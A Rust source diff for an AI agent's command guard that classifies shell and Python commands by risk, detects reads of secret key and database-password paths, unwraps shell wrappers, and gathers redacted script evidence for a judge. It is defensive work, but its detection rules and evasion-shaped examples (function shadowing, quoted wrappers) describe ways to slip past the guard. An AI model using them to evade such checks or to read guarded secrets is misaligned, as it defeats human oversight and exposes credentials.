@@ -23,10 +23,11 @@
 mod workspace_floor;
 
 use crate::llm::tool_names as tn;
-use serde::{Deserialize, Serialize};
 use serde_json::Value;
 use std::borrow::Cow;
 use std::collections::BTreeMap;
+
+use crate::core::environment_variables::{is_code_injecting_env_name, LUCIDOS_CLI_ENV_NAMES};
 use std::ops::Range;
 use std::path::{Component, Path, PathBuf};
 use std::sync::LazyLock;
@@ -56,83 +57,7 @@ pub enum RiskLane {
     IrreversibleDanger,
 }
 
-/// The kind of irreversible real-world side-effect a command may perform. Only
-/// meaningful for [`RiskLane::IrreversibleDanger`]. The judge tags each
-/// irreversible command with a category, and the static fallback derives one
-/// for the shapes it recognises. An unattended *trigger* runs the command only
-/// when its declared **side-effect grant** contains that category (ADR 0002).
-/// A chat turn always asks the user, whatever the category.
-///
-/// Wire form is snake_case. It rides on the trigger payload's
-/// `side_effect_grant` array and in the judge's JSON `category` field.
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
-#[serde(rename_all = "snake_case")]
-pub enum SideEffectCategory {
-    /// Sending email or messages — `mail`/`mailx`/`sendmail`, `osascript`
-    /// driving Mail/Messages, Python `smtplib`.
-    Email,
-    /// A mutating outbound HTTP request — `curl`/`wget` POST/PUT/DELETE/PATCH or
-    /// a data upload, Python `requests`/`httpx`/`session` writes.
-    ExternalApi,
-    /// A cloud-service mutation via the `gh`, `aws`, or `gcloud` CLIs.
-    CloudCli,
-    /// Deleting or overwriting files OUTSIDE the workspace — irreversible (no
-    /// checkpoint is possible). Tagged by the judge, or by the static
-    /// fallback's destruction scan when the judge is off (see
-    /// [`fallback_classify`]).
-    OutOfWorkspaceDestruction,
-    /// An irreversible side-effect that doesn't fit the named categories — the
-    /// judge's catch-all, and the fallback when the judge can't categorise. A
-    /// trigger must grant `other` to run such a command.
-    Other,
-    /// A read of the secrets key directory or the shared Postgres password
-    /// file (see [`command_reads_secret`]). Never grantable, so it has no wire
-    /// form: no trigger can name it, and an unattended lane always refuses it.
-    #[serde(skip)]
-    SecretRead,
-}
-
-impl SideEffectCategory {
-    /// Whether a trigger's side-effect grant can allow this category.
-    pub fn is_grantable(&self) -> bool {
-        !matches!(self, Self::SecretRead)
-    }
-
-    /// Noun phrase for LLM-facing refusal / card text — reads as "may perform
-    /// {reason}".
-    pub fn reason(&self) -> &'static str {
-        match self {
-            Self::Email => {
-                "an email or messaging side-effect (mail, sendmail, or AppleScript driving Mail/Messages)"
-            }
-            Self::ExternalApi => {
-                "a mutating HTTP request (POST/PUT/DELETE/PATCH or a data upload)"
-            }
-            Self::CloudCli => "a cloud-service mutation via gh, aws, or gcloud",
-            Self::OutOfWorkspaceDestruction => "destruction of files outside the workspace",
-            Self::Other => "an irreversible real-world side-effect",
-            Self::SecretRead => {
-                "a read of the workspace's secret keys or the shared database password"
-            }
-        }
-    }
-
-    /// Short user-facing label for the trigger side-effect-grant UI. Kept in
-    /// sync with the frontend `SIDE_EFFECT_CATEGORIES` list by
-    /// `components/triggers/__tests__/side-effect-categories-mirror.test.ts`,
-    /// which reads these arms and the enum above out of this file. The mirror
-    /// skips a `#[serde(skip)]` variant, which the UI never offers.
-    pub fn label(&self) -> &'static str {
-        match self {
-            Self::Email => "Send email or messages",
-            Self::ExternalApi => "Call external APIs (mutating HTTP)",
-            Self::CloudCli => "Cloud CLI mutations (gh / aws / gcloud)",
-            Self::OutOfWorkspaceDestruction => "Destroy files outside the workspace",
-            Self::Other => "Other irreversible side-effects",
-            Self::SecretRead => "Read secret keys",
-        }
-    }
-}
+pub use crate::engine::thread_events::permission::side_effect::SideEffectCategory;
 
 /// Where a command runs, which decides how far the guard can check its paths.
 #[derive(Debug, Clone, Copy)]
@@ -146,7 +71,7 @@ pub enum CommandSite<'a> {
 }
 
 impl<'a> CommandSite<'a> {
-    fn root(self) -> Option<&'a Path> {
+    pub fn root(self) -> Option<&'a Path> {
         match self {
             Self::TextOnly { root } => root,
             Self::Workspace(root) => Some(root),
@@ -251,6 +176,156 @@ pub struct JudgeInput {
     /// refused to see through is denied. An unrecognised head (`cargo build`)
     /// still runs on both.
     pub fast_path_refused: bool,
+    /// Bounded, redacted evidence for the judge alone.
+    pub script_sources: Vec<ScriptSource>,
+}
+
+/// A script excerpt, or a named omission when an evidence bound was reached.
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
+pub struct ScriptSource {
+    pub path: String,
+    pub source: String,
+    pub status: String,
+}
+
+const SCRIPT_SOURCE_FILES: usize = 3;
+const SCRIPT_SOURCE_BYTES: usize = 16 * 1024;
+
+/// Read relative components through directory descriptors, refusing every symlink.
+/// This keeps a concurrent rename from redirecting the read outside the workspace.
+fn open_script(root: &Path, relative: &Path) -> Option<std::fs::File> {
+    use std::os::fd::{AsRawFd, FromRawFd};
+    use std::os::unix::ffi::OsStrExt;
+    let mut file = std::fs::File::open(root).ok()?;
+    let parts: Vec<_> = relative.components().collect();
+    for (index, part) in parts.iter().enumerate() {
+        let std::path::Component::Normal(name) = part else {
+            return None;
+        };
+        let name = std::ffi::CString::new(name.as_bytes()).ok()?;
+        let flags = libc::O_RDONLY
+            | libc::O_CLOEXEC
+            | libc::O_NOFOLLOW
+            | libc::O_NONBLOCK
+            | if index + 1 < parts.len() {
+                libc::O_DIRECTORY
+            } else {
+                0
+            };
+        // SAFETY: both descriptors and the NUL-terminated name live through openat.
+        let fd = unsafe { libc::openat(file.as_raw_fd(), name.as_ptr(), flags) };
+        if fd < 0 {
+            return None;
+        }
+        // SAFETY: openat returned a new descriptor, now owned only by this File.
+        file = unsafe { std::fs::File::from_raw_fd(fd) };
+    }
+    file.metadata().ok()?.is_file().then_some(file)
+}
+
+/// Only the ambiguous verdict carries source. Static proofs never inspect it.
+fn script_sources(
+    command: &str,
+    disk: Option<OnDisk<'_>>,
+    paths: &SecretPaths,
+) -> Vec<ScriptSource> {
+    use std::io::Read;
+    let Some(disk) = disk else { return vec![] };
+    let mut result = Vec::new();
+    let mut remaining = SCRIPT_SOURCE_BYTES;
+    let mut read_count = 0;
+    let mut seen = std::collections::HashSet::new();
+    for segment in command_segments(command) {
+        let argv = shell_argv(&segment);
+        let Some(head) = argv.first() else { continue };
+        // A changed cwd makes relative operands ambiguous to this evidence reader.
+        if matches!(head.text.as_str(), "cd" | "pushd" | "popd") {
+            break;
+        }
+        let interpreter = matches!(
+            head.text.as_str(),
+            "python" | "python3" | "bash" | "sh" | "zsh" | "node" | "ruby" | "perl"
+        );
+        let candidate = if interpreter {
+            argv.iter()
+                .skip(1)
+                .find(|word| {
+                    // Only flags with no operand are safe to skip here.
+                    !(word.text == "--"
+                        || (matches!(head.text.as_str(), "python" | "python3")
+                            && matches!(
+                                word.text.as_str(),
+                                "-u" | "-B" | "-E" | "-I" | "-s" | "-S"
+                            )))
+                })
+                .filter(|word| !word.text.starts_with('-'))
+        } else {
+            Some(head).filter(|word| word.text.contains('/'))
+        };
+        let Some(candidate) = candidate else { continue };
+        if candidate.expands
+            || path_location(&candidate.text, Some(disk.root), Some(disk))
+                != PathLocation::Workspace
+        {
+            continue;
+        }
+        let absolute = disk.root.join(&candidate.text);
+        let Ok(relative) = absolute.strip_prefix(disk.root) else {
+            continue;
+        };
+        let relative: PathBuf = relative
+            .components()
+            .filter(|c| *c != std::path::Component::CurDir)
+            .collect();
+        if relative.components().any(|c| !matches!(c, std::path::Component::Normal(n) if !n.to_string_lossy().starts_with('.')))
+            || mentions_paths(&paths.hidden, &[], &absolute.to_string_lossy())
+            || mentions_paths(&paths.private, &[], &absolute.to_string_lossy())
+            || !seen.insert(relative.clone()) { continue; }
+        let Some(file) = open_script(disk.root, &relative) else {
+            continue;
+        };
+        let mut excerpt = ScriptSource {
+            path: relative.to_string_lossy().into_owned(),
+            source: String::new(),
+            status: String::new(),
+        };
+        if read_count >= SCRIPT_SOURCE_FILES {
+            excerpt.status = "skipped: file limit".into();
+        } else if file
+            .metadata()
+            .map_or(true, |m| m.len() >= remaining as u64)
+        {
+            excerpt.status = "skipped: byte limit".into();
+        } else {
+            read_count += 1;
+            let mut bytes = Vec::new();
+            if file.take(remaining as u64).read_to_end(&mut bytes).is_err() {
+                continue;
+            }
+            remaining -= bytes.len();
+            if remaining == 0 {
+                excerpt.status = "skipped: byte limit".into();
+                result.push(excerpt);
+                continue;
+            }
+            let Ok(source) = String::from_utf8(bytes) else {
+                excerpt.status = "skipped: non-UTF-8 source".into();
+                result.push(excerpt);
+                continue;
+            };
+            let redacted = crate::core::redact_postgres_secrets(&source);
+            let expansion = redacted.len().saturating_sub(source.len());
+            if expansion > remaining {
+                excerpt.status = "skipped: byte limit".into();
+            } else {
+                remaining -= expansion;
+                excerpt.source = redacted;
+                excerpt.status = "complete".into();
+            }
+        }
+        result.push(excerpt);
+    }
+    result
 }
 
 impl JudgeInput {
@@ -260,8 +335,12 @@ impl JudgeInput {
     /// the verdict for the same text.
     pub fn cache_key(&self) -> String {
         format!(
-            "{}\u{0}{}\u{0}{}\u{0}{}",
-            self.tool_name, self.command, self.out_of_workspace, self.fast_path_refused
+            "{}\u{0}{}\u{0}{}\u{0}{}\u{0}{}",
+            self.tool_name,
+            self.command,
+            self.out_of_workspace,
+            self.fast_path_refused,
+            serde_json::to_string(&self.script_sources).expect("script evidence serializes")
         )
     }
 }
@@ -278,6 +357,9 @@ pub struct JudgedClassification {
     /// defaulting to [`SideEffectCategory::Other`]). Drives the trigger
     /// side-effect-grant check; `None` for every non-irreversible lane.
     pub category: Option<SideEffectCategory>,
+    /// Judge distribution or failure, retained across per-turn cache hits.
+    /// Static classifications have no model answer.
+    pub judge_reason: Option<String>,
 }
 
 /// Shells whose `-c` payload [`unwrap_shell_command`] descends into.
@@ -298,14 +380,34 @@ pub(crate) const GUARD_SHELLS: [&str; 6] = ["sh", "bash", "zsh", "dash", "ksh", 
 /// handed the same shape. Returns the original command when it is not a
 /// recognized shell wrapper.
 pub(crate) fn unwrap_shell_command(command: &str) -> Cow<'_, str> {
-    let trimmed = command.trim_start();
-    let toks: Vec<&str> = trimmed.split_whitespace().collect();
-    let Some(shell_at) = shell_token_index(&toks) else {
+    let Some(at) = shell_script_operand_at(command) else {
         return Cow::Borrowed(command);
     };
+    // One quote layer is stripped so the common `zsh -lc 'curl ...'` form
+    // classifies as a clean `curl ...`.
+    let (script, tail) = split_shell_script_operand(command[at..].trim_end());
+    // `sh -c <script> [$0 args]` makes the tail positional parameters, which is
+    // why cutting at the close quote is right. The tail is only OURS to discard
+    // when it really is plain words. A control operator there belongs to the
+    // OUTER shell and runs, so returning the script alone would hide it from
+    // every scan. Fall back to the whole command, which the segment split
+    // covers end to end. Strictly more scanning, never less.
+    if tail_runs_more_commands(tail) {
+        return Cow::Borrowed(command);
+    }
+    script
+}
+
+/// The byte offset in `command` where a shell wrapper's script operand starts,
+/// just past its `-c`-style flag and the blanks after it. `None` when
+/// `command` is no recognised shell wrapper.
+fn shell_script_operand_at(command: &str) -> Option<usize> {
+    let lead = command.len() - command.trim_start().len();
+    let trimmed = &command[lead..];
+    let toks: Vec<&str> = trimmed.split_whitespace().collect();
+    let shell_at = shell_token_index(&toks)?;
     // Walk whitespace-delimited tokens (with byte offsets) to find the `-c`-style
-    // flag; everything after it is the script. One quote layer is stripped so the
-    // common `zsh -lc 'curl ...'` form classifies as a clean `curl ...`.
+    // flag; everything after it is the script.
     let bytes = trimmed.as_bytes();
     let mut i = 0;
     let mut tok_index = 0usize;
@@ -329,21 +431,11 @@ pub(crate) fn unwrap_shell_command(command: &str) -> Cow<'_, str> {
             continue;
         }
         if is_shell_c_flag(&trimmed[start..i]) {
-            let (script, tail) = split_shell_script_operand(trimmed[i..].trim());
-            // `sh -c <script> [$0 args]` makes the tail positional
-            // parameters, which is why cutting at the close quote is right. The
-            // tail is only OURS to discard when it really is plain words. A
-            // control operator there belongs to the OUTER shell and runs, so
-            // returning the script alone would hide it from every scan. Fall
-            // back to the whole command, which the segment split covers end to
-            // end. Strictly more scanning, never less.
-            if tail_runs_more_commands(tail) {
-                return Cow::Borrowed(command);
-            }
-            return script;
+            let rest = &trimmed[i..];
+            return Some(lead + i + rest.len() - rest.trim_start().len());
         }
     }
-    Cow::Borrowed(command)
+    None
 }
 
 /// True when `arch`'s arguments name a command for it to exec, rather than only
@@ -626,27 +718,165 @@ fn tail_runs_more_commands(tail: &str) -> bool {
         || has_command_substitution(tail)
 }
 
-/// Secret and snapshot paths under the Lucidos home. Matched as a suffix, so `~`, `$HOME`,
-/// `${HOME}` and an absolute home all match.
-static SECRET_PATHS: LazyLock<[String; 4]> = LazyLock::new(|| {
-    let home = lucidos_home::HOME_DIR_NAME;
-    [
-        format!(
-            "{home}/{}",
-            crate::core::secret_store::key_store::KEY_DIR_NAME
-        ),
-        format!("{home}/{}", lucidos_local_token::SHARED_PG_PASSWORD_FILE),
-        format!("{home}/snapshots"),
-        format!("{home}/{}", lucidos_local_token::LOCAL_TOKEN_FILE),
-    ]
-});
+/// The private subtree under the Lucidos home, then every name an older
+/// release kept directly in the home. Matched as a suffix, so `~`, `$HOME`,
+/// `${HOME}` and an absolute home all match. A moved subtree
+/// (`LUCIDOS_PRIVATE_DIR`) holds the secrets in place of the default one.
+/// It is listed by its own path. Under the user's home it is also listed in
+/// the three home forms.
+static SECRET_PATHS: LazyLock<Vec<String>> =
+    LazyLock::new(|| secret_paths(lucidos_home::private::relocated(), home_dir().as_deref()));
 
-/// Whether `text` names a secret path. Quotes and backslashes are dropped and
-/// `/./` and `//` collapse first, so `"$HOME/.lucidos"/secret-keys` matches.
-///
-/// A static rule is a stopgap: string building or `base64` gets around it.
-/// The real boundary is an OS sandbox (docs/temporary-measures.md).
-pub fn mentions_secret_path(text: &str) -> bool {
+fn secret_paths(relocated: Option<PathBuf>, user_home: Option<&Path>) -> Vec<String> {
+    let home = lucidos_home::HOME_DIR_NAME;
+    std::iter::once(lucidos_home::private::DIR_NAME.to_string())
+        .chain(lucidos_home::private::legacy_entries())
+        .map(|name| format!("{home}/{name}"))
+        .chain(
+            relocated
+                .into_iter()
+                .flat_map(|dir| moved_secret_paths(&dir, user_home)),
+        )
+        .collect()
+}
+
+pub const SECRET_READ_STEER: &str = "No grant covers Lucidos's private files, and the agent sandbox blocks them when it is on. For this workspace's engine log, use `lucidos diagnostic-log query`. Do not retry with another spelling.";
+
+/// Secret paths for the policy and mode of the process executing a call.
+#[derive(Debug, Clone)]
+pub struct SecretPaths {
+    hidden: Vec<String>,
+    private: Vec<String>,
+    open: Vec<String>,
+    text_gate: bool,
+}
+
+impl SecretPaths {
+    pub fn for_policy(
+        policy: &lucidos_agent_sandbox::Policy,
+        mode: Option<crate::runtime::agent_sandbox::SandboxMode>,
+    ) -> Self {
+        Self::for_policy_with_truncation(policy, mode, lucidos_agent_sandbox::guards_truncation())
+    }
+
+    pub(crate) fn for_policy_with_truncation(
+        policy: &lucidos_agent_sandbox::Policy,
+        mode: Option<crate::runtime::agent_sandbox::SandboxMode>,
+        guards_truncation: bool,
+    ) -> Self {
+        let policy = policy.resolved();
+        let home = home_dir();
+        let mut hidden = SECRET_PATHS.clone();
+        hidden.extend(
+            policy
+                .hidden
+                .iter()
+                .flat_map(|p| moved_secret_paths(p, home.as_deref())),
+        );
+        let mut open = Vec::new();
+        if mode == Some(crate::runtime::agent_sandbox::SandboxMode::Enforced) {
+            for root in &policy.open_within_hidden {
+                open.extend(moved_secret_paths(root, home.as_deref()));
+                // Retain the suffix spellings of the legacy entries too.
+                let root = root.to_string_lossy();
+                for suffix in SECRET_PATHS.iter() {
+                    if let Some(at) = root.find(suffix.as_str()) {
+                        open.push(root[at..].to_string());
+                    }
+                }
+            }
+        }
+        Self {
+            hidden,
+            private: policy
+                .private
+                .iter()
+                .flat_map(|p| moved_secret_paths(p, home.as_deref()))
+                .collect(),
+            open,
+            text_gate: mode != Some(crate::runtime::agent_sandbox::SandboxMode::Enforced)
+                || !guards_truncation,
+        }
+    }
+
+    pub fn for_sandbox(sandbox: &crate::runtime::agent_sandbox::Sandbox, workspace: &Path) -> Self {
+        Self::for_policy(
+            &sandbox.policy_for_execution(workspace),
+            Some(sandbox.mode()),
+        )
+    }
+
+    /// Quotes and backslashes are dropped, and `/./` and `//` collapse.
+    /// The OS sandbox remains the boundary against constructed paths and links.
+    pub fn mentions(&self, text: &str) -> bool {
+        mentions_paths(&self.private, &[], text) || mentions_paths(&self.hidden, &self.open, text)
+    }
+
+    pub fn command(&self, command: &str) -> bool {
+        self.shell_at(command, 0)
+    }
+
+    pub fn python(&self, code: &str) -> bool {
+        self.mentions(code) || self.mentions(&unwrap_shell_command(code))
+    }
+
+    pub fn tool(&self, tool_name: &str, text: &str) -> bool {
+        if matches!(tool_name, tn::RUN_BASH | tn::RUN_BASH_BACKGROUND) {
+            self.command(text)
+        } else {
+            self.python(text)
+        }
+    }
+
+    /// The executing boundary owns private paths only if it stops both reads
+    /// and truncation. Keep detection separate for grants and failure steers.
+    pub fn gates_tool(&self, tool_name: &str, text: &str) -> bool {
+        self.text_gate && self.tool(tool_name, text)
+    }
+
+    fn shell_at(&self, command: &str, depth: usize) -> bool {
+        if depth < MAX_SHELL_LAYERS {
+            if let Some((outer, script)) = literal_wrapper_script(command) {
+                return self.mentions(&outer) || self.shell_at(&script, depth + 1);
+            }
+        }
+        let unwrapped = unwrap_shell_command(command);
+        self.mentions(&secret_scan_text(command))
+            || (unwrapped != command && self.mentions(&unwrapped))
+    }
+
+    pub fn conservative() -> Self {
+        Self::for_policy(
+            &crate::runtime::agent_sandbox::policy_for(Path::new("/")),
+            None,
+        )
+    }
+}
+
+/// Every spelling of the moved subtree. Each is rebuilt from its components,
+/// so a trailing `/`, `//` or `/./` in the variable cannot hide it.
+fn moved_secret_paths(dir: &Path, user_home: Option<&Path>) -> Vec<String> {
+    let dir: PathBuf = dir.components().collect();
+    let mut paths = vec![dir.to_string_lossy().into_owned()];
+    let under_home = user_home
+        .and_then(|home| {
+            dir.strip_prefix(home.components().collect::<PathBuf>())
+                .ok()
+        })
+        .filter(|rest| !rest.as_os_str().is_empty());
+    if let Some(rest) = under_home {
+        let rest = rest.to_string_lossy();
+        paths.extend(["~", "$HOME", "${HOME}"].map(|home| format!("{home}/{rest}")));
+    }
+    paths
+}
+
+#[cfg(test)]
+fn mentions_any_path(secrets: &[String], text: &str) -> bool {
+    mentions_paths(secrets, &[], text)
+}
+
+fn mentions_paths(secrets: &[String], open: &[String], text: &str) -> bool {
     let mut path: String = text
         .chars()
         .filter(|c| !matches!(c, '\'' | '"' | '\\'))
@@ -660,20 +890,151 @@ pub fn mentions_secret_path(text: &str) -> bool {
     }
     // A match must end the path name: `secret-keys-notes` is another file.
     let ends_name = |c: char| !(c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'));
-    SECRET_PATHS.iter().any(|secret| {
+    secrets.iter().any(|secret| {
         path.match_indices(secret.as_str()).any(|(at, _)| {
             path[at + secret.len()..]
                 .chars()
                 .next()
                 .is_none_or(ends_name)
+                && !open.iter().any(|root| {
+                    path.match_indices(root.as_str()).any(|(start, _)| {
+                        let end = start + root.len();
+                        // Reopen only this enclosing match, never a nested private root.
+                        // With quotes removed, only `/` or the end proves that
+                        // the open root is a complete directory name.
+                        if start > at
+                            || end < at + secret.len()
+                            || path[end..].chars().next().is_some_and(|c| c != '/')
+                        {
+                            return false;
+                        }
+                        let tail = path[end..]
+                            .split([';', '|', '&', ')', '('])
+                            .next()
+                            .unwrap_or("");
+                        !tail
+                            .split(|c: char| c == '/' || c.is_whitespace())
+                            .any(|part| part == "..")
+                    })
+                })
         })
     })
 }
 
-/// Whether a bash command or Python code reads a secret path, read both as
-/// written and as the inner script of a shell wrapper.
+/// Whether a bash command reads a secret path, read both as written and as the
+/// inner script of a shell wrapper.
+///
+/// A literal heredoc body that nothing in the command can run is document
+/// text, so it is not scanned ([`secret_scan_text`]). Everything else is.
 pub fn command_reads_secret(command: &str) -> bool {
-    mentions_secret_path(command) || mentions_secret_path(&unwrap_shell_command(command))
+    SecretPaths::conservative().command(command)
+}
+
+/// Whether Python code names a secret path anywhere in its text.
+#[cfg(test)]
+pub fn python_reads_secret(code: &str) -> bool {
+    SecretPaths::conservative().python(code)
+}
+
+/// Read `text` according to the tool executing it.
+#[cfg(test)]
+pub fn tool_text_reads_secret(tool_name: &str, text: &str) -> bool {
+    SecretPaths::conservative().tool(tool_name, text)
+}
+
+/// A shell wrapper's decoded script and the rest of the command, when the
+/// outer shell expands nothing in the script operand.
+///
+/// The operand must open with `'` and hold only single-quoted runs and
+/// backslash escapes. That covers Codex's `'…'\''…'` rendering of argv. A
+/// double-quoted or ANSI-C run returns `None`: the outer shell expands
+/// `$(…)` inside it before the inner shell runs. So do an unterminated run,
+/// an escaped newline and a tail that runs more commands.
+fn literal_wrapper_script(command: &str) -> Option<(String, String)> {
+    let at = shell_script_operand_at(command)?;
+    let b = command.as_bytes();
+    if b.get(at) != Some(&b'\'') {
+        return None;
+    }
+    let mut script = String::new();
+    let mut i = at;
+    while i < b.len() && !ends_shell_word(b[i]) {
+        match b[i] {
+            b'\'' => {
+                let close = i + 1 + command[i + 1..].find('\'')?;
+                script.push_str(&command[i + 1..close]);
+                i = close + 1;
+            }
+            b'\\' if matches!(b.get(i + 1), Some(c) if *c != b'\n') => {
+                i += 1 + push_char_at(&mut script, command, i + 1);
+            }
+            _ => return None,
+        }
+    }
+    let tail = &command[i..];
+    if tail_runs_more_commands(tail) {
+        return None;
+    }
+    Some((format!("{} {tail}", &command[..at]), script))
+}
+
+/// The text the secret scan reads: `command` without its literal heredoc
+/// bodies when nothing in it can run them, else `command` whole.
+///
+/// The bodies drop only when every body is placed and terminated
+/// ([`blank_literal_heredoc_bodies`]), no substitution remains, and every
+/// segment only writes data ([`writes_data_only`]). The opener line, redirect
+/// targets, here-strings and arguments stay in the text.
+fn secret_scan_text(command: &str) -> Cow<'_, str> {
+    let Some(blanked) =
+        blank_literal_heredoc_bodies(command, |_| false).filter(|b| !b.unterminated)
+    else {
+        return Cow::Borrowed(command);
+    };
+    if has_command_substitution(&blanked.text)
+        || !command_segments(&blanked.text).all(|s| writes_data_only(&s))
+    {
+        return Cow::Borrowed(command);
+    }
+    Cow::Owned(blanked.text)
+}
+
+/// Heads that only copy, print or count their input, and never run it.
+const DATA_SINK_HEADS: [&str; 10] = [
+    "cat", "tee", "printf", "echo", "mkdir", "ls", "wc", "head", "tail", "true",
+];
+
+/// The `lucidos` verbs that store a file's text and never run it.
+const LUCIDOS_DATA_SINK_VERBS: [[&str; 2]; 3] = [
+    ["successor", "start"],
+    ["successor", "offer"],
+    ["data", "write"],
+];
+
+/// True when `segment` is empty, only assignments, or headed by a data sink.
+/// The head is compared as written, so a path-qualified, quoted or escaped
+/// head is no sink. So is a code-injecting assignment before it.
+///
+/// A parenthesis fails it: `cat () ( bash )` makes a later `cat` run its body.
+fn writes_data_only(segment: &str) -> bool {
+    if segment.contains(['(', ')']) {
+        return false;
+    }
+    let toks: Vec<&str> = segment.split_whitespace().collect();
+    let mut at = 0;
+    while at < toks.len() && is_assignment_word(toks[at]) {
+        if is_code_injecting_assignment(toks[at]) {
+            return false;
+        }
+        at += assignment_token_span(&toks[at..]);
+    }
+    match &toks[at..] {
+        [] => true,
+        ["lucidos", verb @ ..] => LUCIDOS_DATA_SINK_VERBS
+            .iter()
+            .any(|sink| verb.starts_with(sink)),
+        [head, ..] => DATA_SINK_HEADS.contains(head),
+    }
 }
 
 /// The static, deterministic classification pass.
@@ -682,6 +1043,9 @@ pub fn command_reads_secret(command: &str) -> bool {
 /// tool is `Settled(Safe)` (the guard never gates reads, edits, HTTP, etc.).
 /// Settles the two ends of the spectrum and hands the middle to the judge:
 ///   * catastrophic deny-list → `Settled(Catastrophic)` (hard-block),
+///   * a workspace floor match only its fallback proves →
+///     `SettledIrreversible(UnprovenWorkspaceDestruction)`, which no grant
+///     covers,
 ///   * a secret read ([`command_reads_secret`]) →
 ///     `SettledIrreversible(SecretRead)`, which no grant covers,
 ///   * obviously read-only / in-workspace-write shapes → `Settled(Safe)`,
@@ -702,7 +1066,23 @@ pub fn static_classify_trusting(
     site: CommandSite<'_>,
     trusted: &TrustedHeads,
 ) -> StaticVerdict {
-    site.with_disk(|disk| static_classify_at(tool_name, input, site.root(), disk, trusted))
+    static_classify_with_paths(
+        tool_name,
+        input,
+        site,
+        trusted,
+        &SecretPaths::conservative(),
+    )
+}
+
+pub fn static_classify_with_paths(
+    tool_name: &str,
+    input: &Value,
+    site: CommandSite<'_>,
+    trusted: &TrustedHeads,
+    paths: &SecretPaths,
+) -> StaticVerdict {
+    site.with_disk(|disk| static_classify_at(tool_name, input, site.root(), disk, trusted, paths))
 }
 
 fn static_classify_at(
@@ -711,6 +1091,7 @@ fn static_classify_at(
     root: Option<&Path>,
     disk: Option<OnDisk<'_>>,
     trusted: &TrustedHeads,
+    paths: &SecretPaths,
 ) -> StaticVerdict {
     let Some(raw) = command_text(tool_name, input) else {
         return StaticVerdict::Settled(RiskLane::Safe);
@@ -720,10 +1101,16 @@ fn static_classify_at(
     // this, a wrapped command reads as head `bash`, skips the catastrophic
     // hard-block, and with the judge off falls through to Safe.
     let unwrapped = unwrap_shell_command(raw);
-    if catastrophic_reason_at(&unwrapped, 0, root).is_some() {
-        return StaticVerdict::Settled(RiskLane::Catastrophic);
+    match tool_catastrophe(tool_name, raw, root) {
+        Some(Catastrophe::Proven(_)) => return StaticVerdict::Settled(RiskLane::Catastrophic),
+        Some(Catastrophe::Unproven(_)) => {
+            return StaticVerdict::SettledIrreversible(
+                SideEffectCategory::UnprovenWorkspaceDestruction,
+            )
+        }
+        None => {}
     }
-    if command_reads_secret(raw) {
+    if paths.gates_tool(tool_name, raw) {
         return StaticVerdict::SettledIrreversible(SideEffectCategory::SecretRead);
     }
     let is_bash = matches!(tool_name, tn::RUN_BASH | tn::RUN_BASH_BACKGROUND);
@@ -734,9 +1121,6 @@ fn static_classify_at(
         .then(|| after_root_cd(&unwrapped, root, disk, home.as_deref()))
         .flatten()
         .unwrap_or(unwrapped.as_ref());
-    // Python declines are all ACTIVE signals: a shell-out the proof cannot
-    // read, eval, a network write, a destruction call, a package install. None
-    // is an unlisted-head omission, so the whole set is a refusal.
     let packages = (!is_bash).then(|| python_packages(input)).flatten();
     let declined = if is_bash {
         bash_fast_path(cmd, disk, trusted)
@@ -744,6 +1128,7 @@ fn static_classify_at(
         match python_program_proof(cmd, disk, 0) {
             Proof::Catastrophic => return StaticVerdict::Settled(RiskLane::Catastrophic),
             Proof::Safe if packages.is_none() => None,
+            Proof::UnlistedImport if packages.is_none() => Some(FastPathDecline::Omission),
             _ => Some(FastPathDecline::Refusal),
         }
     };
@@ -769,6 +1154,11 @@ fn static_classify_at(
                 == Some(DestructionScope::OutOfWorkspace)
         },
         fast_path_refused: declined == FastPathDecline::Refusal,
+        script_sources: if is_bash {
+            script_sources(cmd, disk, paths)
+        } else {
+            vec![]
+        },
     })
 }
 
@@ -798,6 +1188,7 @@ fn static_classify_at(
 pub fn fallback_classify(ji: &JudgeInput, site: CommandSite<'_>) -> JudgedClassification {
     if let Some(cat) = static_side_effect_category(&ji.command) {
         return JudgedClassification {
+            judge_reason: None,
             lane: RiskLane::IrreversibleDanger,
             summary: Some(format!("May perform {}.", cat.reason())),
             category: Some(cat),
@@ -816,6 +1207,7 @@ pub fn fallback_classify(ji: &JudgeInput, site: CommandSite<'_>) -> JudgedClassi
     });
     match scope {
         Some(DestructionScope::OutOfWorkspace) => JudgedClassification {
+            judge_reason: None,
             lane: RiskLane::IrreversibleDanger,
             summary: Some(format!(
                 "May perform {}.",
@@ -827,12 +1219,23 @@ pub fn fallback_classify(ji: &JudgeInput, site: CommandSite<'_>) -> JudgedClassi
             if !ji.fast_path_refused || refusal_is_the_destruction(ji, is_bash) =>
         {
             JudgedClassification {
+                judge_reason: None,
                 lane: RiskLane::ReversibleDanger,
                 summary: None,
                 category: None,
             }
         }
+        Some(DestructionScope::Unresolved) => JudgedClassification {
+            judge_reason: None,
+            lane: RiskLane::IrreversibleDanger,
+            summary: Some(
+                "The guard cannot tell where this command deletes or overwrites, and the command judge is off."
+                    .to_string(),
+            ),
+            category: Some(SideEffectCategory::Other),
+        },
         _ if ji.fast_path_refused => JudgedClassification {
+            judge_reason: None,
             lane: RiskLane::IrreversibleDanger,
             summary: Some(
                 "The guard cannot see what this command runs, and the command judge is off."
@@ -841,6 +1244,7 @@ pub fn fallback_classify(ji: &JudgeInput, site: CommandSite<'_>) -> JudgedClassi
             category: Some(SideEffectCategory::Other),
         },
         _ => JudgedClassification {
+            judge_reason: None,
             lane: RiskLane::Safe,
             summary: None,
             category: None,
@@ -866,6 +1270,8 @@ enum DestructionScope {
     InWorkspace,
     /// Touches a target outside the workspace — no checkpoint can cover it.
     OutOfWorkspace,
+    /// The destination cannot be resolved; ask without claiming outside evidence.
+    Unresolved,
 }
 
 /// Heads that destroy or overwrite every path argument they're given.
@@ -936,7 +1342,18 @@ fn bash_destruction_scope_at(
     let scratch = ScratchWrites::Exempt {
         tmpdir_trusted: tmpdir_trusted_for(command),
     };
-    destruction_scope_in(command, 0, root, disk, relative_paths_escape, scratch)
+    destruction_scope_in(
+        command,
+        0,
+        root,
+        disk,
+        if relative_paths_escape {
+            PathLocation::Outside
+        } else {
+            PathLocation::Workspace
+        },
+        scratch,
+    )
 }
 
 /// [`bash_destruction_scope_at`] at substitution depth `depth`. A body gets no
@@ -946,22 +1363,31 @@ fn destruction_scope_in(
     depth: usize,
     root: Option<&Path>,
     disk: Option<OnDisk<'_>>,
-    relative_paths_escape: bool,
+    initial_location: PathLocation,
     scratch: ScratchWrites,
 ) -> Option<DestructionScope> {
